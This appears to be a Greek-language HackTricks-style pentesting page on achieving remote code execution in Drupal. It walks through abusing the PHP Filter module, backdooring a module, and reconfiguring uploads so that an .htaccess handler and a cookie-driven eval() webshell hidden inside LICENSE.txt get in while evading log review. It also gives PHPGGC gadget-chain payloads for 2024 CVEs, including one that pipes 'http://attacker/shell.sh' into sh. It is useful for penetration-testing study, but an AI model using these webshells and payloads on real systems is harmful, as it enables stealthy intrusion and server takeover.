# Drupal RCE

{{#include ../../../banners/hacktricks-training.md}}

## Με το PHP Filter Module

> [!WARNING]
> Σε παλαιότερες εκδόσεις του Drupal **(before version 8)**, ήταν δυνατό να συνδεθείτε ως admin και να **ενεργοποιήσετε το `PHP filter` module**, το οποίο "Allows embedded PHP code/snippets to be evaluated." Ωστόσο, από την έκδοση 8 αυτό το module δεν εγκαθίσταται από προεπιλογή.

1. Μεταβείτε στο **/modules/php** και αν επιστραφεί σφάλμα 403 τότε το **PHP filter plugin είναι εγκατεστημένο και μπορείτε να συνεχίσετε**
1. Αν όχι, πηγαίνετε στο `Modules` και τσεκάρετε το κουτάκι του `PHP Filter` και μετά πατήστε `Save configuration`
2. Στη συνέχεια, για να το εκμεταλλευτείτε, κάντε κλικ στο `Add content`, μετά επιλέξτε `Basic Page` ή `Article` και γράψτε το **PHP backdoor**, έπειτα επιλέξτε `PHP` code στη μορφή Text και τέλος επιλέξτε `Preview`
3. Για να το ενεργοποιήσετε, απλώς επισκεφθείτε τον νεοδημιουργημένο node:
```bash
curl http://drupal.local/node/3
```
## Install PHP Filter Module

> [!WARNING]
> Στις τρέχουσες εκδόσεις δεν είναι πλέον δυνατό να εγκαταστήσετε plugins έχοντας μόνο πρόσβαση μέσω web μετά την προεπιλεγμένη εγκατάσταση.

From version **8 onwards, the** [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **module is not installed by default**. To leverage this functionality, we would have to **install the module ourselves**.

1. Κατεβάστε την πιο πρόσφατη έκδοση του module από την ιστοσελίδα του Drupal.
1. `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`
2. Μετά το κατέβασμα μεταβείτε σε **`Administration`** > **`Reports`** > **`Available updates`**.
3. Κάντε κλικ στο **`Browse`**, επιλέξτε το αρχείο από τον φάκελο που το κατεβάσαμε και στη συνέχεια πατήστε **`Install`**.
4. Μόλις το module εγκατασταθεί, μπορούμε να κάνουμε κλικ στο **`Content`** και να **δημιουργήσουμε μια νέα basic page**, παρόμοια με το παράδειγμα του Drupal 7. Και πάλι, βεβαιωθείτε ότι επιλέξατε **`PHP code` από το αναδυόμενο μενού `Text format`**.

## Backdoored Module

> [!WARNING]
> Στις τρέχουσες εκδόσεις δεν είναι πλέον δυνατό να εγκαταστήσετε plugins έχοντας μόνο πρόσβαση μέσω web μετά την προεπιλεγμένη εγκατάσταση.

It was possible to **download** a **module**, add a **backdoor** to it and **install** it. For example, downloading [**Trurnstile**](https://www.drupal.org/project/turnstile) module in compressed format, creating a new PHP backdoor file inside of it, allowing the accessing of the PHP file with a `.htaccess` file:
```html
<IfModule mod_rewrite.c> RewriteEngine On RewriteBase / </IfModule>
```
Και στη συνέχεια πηγαίνοντας στο **`http://drupal.local/admin/modules/install`** για να εγκαταστήσετε το backdoored module και να έχετε πρόσβαση στο **`/modules/turnstile/back.php`** για να το εκτελέσετε.

## Backdooring Drupal with Configuration synchronization <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Αναρτήθηκε από** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### Μέρος 1 (ενεργοποίηση των _Media_ και _Media Library_)

Στο μενού _Extend_ (/admin/modules), μπορείτε να ενεργοποιήσετε ό,τι φαίνεται να είναι plugins που έχουν ήδη εγκατασταθεί. Από προεπιλογή, τα plugins _Media_ και _Media Library_ δεν φαίνεται να είναι ενεργοποιημένα, οπότε ας τα ενεργοποιήσουμε.

Πριν την ενεργοποίηση:

<figure><img src="../../../images/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Μετά την ενεργοποίηση:

<figure><img src="../../../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Μέρος 2 (αξιοποιώντας τη λειτουργία _Configuration synchronization_) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Θα αξιοποιήσουμε τη λειτουργία _Configuration synchronization_ για να κάνουμε dump (export) και upload (import) των ρυθμίσεων του Drupal:

- /admin/config/development/configuration/single/export
- /admin/config/development/configuration/single/import

**Τροποποίηση του system.file.yml**

Ας ξεκινήσουμε τροποποιώντας την πρώτη καταχώρηση `allow_insecure_uploads` από:

File: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Προς:

Αρχείο: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../images/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Εφαρμόστε patch στο field.field.media.document.field_media_document.yml**

Στη συνέχεια, τροποποιήστε τη δεύτερη καταχώριση `file_extensions` από:

File: field.field.media.document.field_media_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../images/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Προς:

Αρχείο: field.field.media.document.field_media_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> Δεν το χρησιμοποιώ σε αυτό το άρθρο αλλά σημειώνεται ότι είναι δυνατό να οριστεί η εγγραφή `file_directory` με αυθαίρετο τρόπο και ότι είναι ευάλωτη σε path traversal attack (οπότε μπορούμε να ανεβούμε προς τα πάνω μέσα στο δέντρο του συστήματος αρχείων του Drupal).

<figure><img src="../../../images/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Μέρος 3 (αξιοποίηση της λειτουργίας _Add Document_) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

Το τελευταίο βήμα είναι το απλούστερο, και χωρίζεται σε δύο υπο-βήματα. Το πρώτο είναι να ανεβάσουμε ένα αρχείο σε μορφή .htaccess για να αξιοποιήσουμε τις Apache οδηγίες και να επιτρέψουμε στα .txt αρχεία να ερμηνεύονται από το PHP engine. Το δεύτερο είναι να ανεβάσουμε ένα .txt αρχείο που περιέχει το payload μας.

Αρχείο: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
Γιατί αυτό το κόλπο είναι εντυπωσιακό;

Επειδή μόλις το Webshell (that we’ll call LICENSE.txt ) ανεβεί στον Web server, μπορούμε να μεταδώσουμε τις εντολές μας μέσω `$_COOKIE` και στα Web server logs αυτό θα εμφανιστεί ως ένα νόμιμο `GET` αίτημα προς ένα αρχείο κειμένου.

Γιατί να ονομάσουμε το Webshell LICENSE.txt?

Απλά επειδή αν πάρουμε το παρακάτω αρχείο, για παράδειγμα [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (που ήδη υπάρχει στο Drupal core), έχουμε ένα αρχείο 339 γραμμών και μεγέθους 17.6 KB, το οποίο είναι ιδανικό για να προσθέσουμε ένα μικρό snippet PHP κώδικα στη μέση (εφόσον το αρχείο είναι αρκετά μεγάλο).

<figure><img src="../../../images/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Αρχείο: Patched LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **Μέρος 3.1 (ανέβασμα αρχείου .htaccess)**

First, we leverage the _Add Document_ (/media/add/document) feature to upload our file containing the Apache directives (.htaccess).

<figure><img src="../../../images/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Μέρος 3.2 (ανέβασμα αρχείου LICENSE.txt)**

Then, we leverage the _Add Document_ (/media/add/document) feature again to upload a Webshell hidden within a license file.

<figure><img src="../../../images/image (11) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (12) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (13) (1).png" alt=""><figcaption></figcaption></figure>

### Μέρος 4 (αλληλεπίδραση με το Webshell) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

The last part consists of interacting with the Webshell.

As shown in the following screenshot, if the cookie expected by our Webshell is not defined, we get the subsequent result when consulting the file via a Web browser.

<figure><img src="../../../images/image (14) (1).png" alt=""><figcaption></figcaption></figure>

When the attacker sets the cookie, he can interact with the Webshell and execute any commands he wants.

<figure><img src="../../../images/image (15) (1).png" alt=""><figcaption></figcaption></figure>

And as you can see in the logs, it looks like only a txt file has been requested.

<figure><img src="../../../images/image (16) (1).png" alt=""><figcaption></figcaption></figure>

Thank you for taking the time to read this article, I hope it will help you get some shells.

## Drupal core gadget chain (SA-CORE-2024-007 / SA-CORE-2024-008)

Two advisories published **20 Nov 2024** (CVE-2024-55637 & CVE-2024-55638) describe new **PHP object gadget chains in Drupal core** (7.0–7.101, 8.x, 10.2.0–10.2.10, 10.3.0–10.3.8, early 11.x). They are **not directly exploitable** but give attackers a ready-made chain once any contrib/module performs `unserialize()` on user input.

Practical exploitation workflow:

1. **Find the unserialize sink** (contrib module or custom code). Grep codebase for `unserialize(` or `Drupal\Component\Serialization\PhpSerialize::decode`. Target endpoints that accept POST/JSON or configuration imports.
2. **Generate a payload** using the vulnerable class path that matches the gadget chain. After SA-CORE-2024-008, the public chain was added to common payload generators. Example with PHPGGC (commit ≥ Dec 2024):
```bash
./phpggc drupal/rce2 system 'id' > payload.ser
```
3. **Deliver the serialized blob** στο sink (π.χ. parameter που gets deserialized). Για ένα form-encoded body:
```bash
curl -X POST https://target/admin/config/some/module \
-d "serialized_setting=$(cat payload.ser)"
```
4. **Trigger destruction** (συχνά αυτόματο στο τέλος του αιτήματος) και εκτέλεσε την εντολή.

Σημειώσεις για δοκιμές:

- Το gadget λειτουργεί μόνο σε εκδόσεις **προηγούμενες από 10.2.11 / 10.3.9 / 7.102** (επιδιορθωμένο). Επαλήθευσε την έκδοση του στόχου μέσω `/core/lib/Drupal.php` ή `CHANGELOG.txt`.
- Οι third‑party DB drivers μπορεί να χρειάζονται επιπλέον σκληραγώγηση· ψάξτε για deployments που παράλειψαν το παράθυρο ενημερώσεων ασφαλείας.

## Πρόσφατο contrib-module unsafe deserialization → RCE

Πολλά contrib modules διόρθωσαν μη ασφαλή μονοπάτια `unserialize()` στα τέλη του 2024. Αν ο ιστότοπος δεν έχει αυτές τις ενημερώσεις, προσφέρουν το exploitable sink που απαιτεί η core gadget chain:

- **Mailjet** (<4.0.1, CVE-2024-13296): δεδομένα ελεγχόμενα από admin που περνούν στο `unserialize()`, επιτρέποντας **PHP Object Injection → RCE** όταν συνδυάζεται με τα core gadgets.
- **Eloqua** (7.x-1.x < 1.15, CVE-2024-13297): παρόμοια μη ασφαλής χρήση του `unserialize()` προσβάσιμη από χρήστες με `access administration pages`.

Ιδέα δοκιμής (authenticated):
```bash
phpggc drupal/rce2 system 'bash -c "curl http://attacker/shell.sh|sh"' > p.ser
curl -b session=ADMINCOOKIE \
-F "import=@p.ser" https://target/admin/config/eloqua/import
```
Αν το module deserializes τα uploaded data, το gadget chain οδηγεί σε RCE. Συνδύασέ το με XSS/CSRF για να κλέψεις admin cookies και να ολοκληρώσεις την attack chain.

## Αναφορές

- [Drupal core – gadget chain – SA-CORE-2024-008](https://www.drupal.org/sa-core-2024-008)
- [Mailjet module – arbitrary PHP code execution – SA-CONTRIB-2024-062](https://www.drupal.org/sa-contrib-2024-062)

{{#include ../../../banners/hacktricks-training.md}}
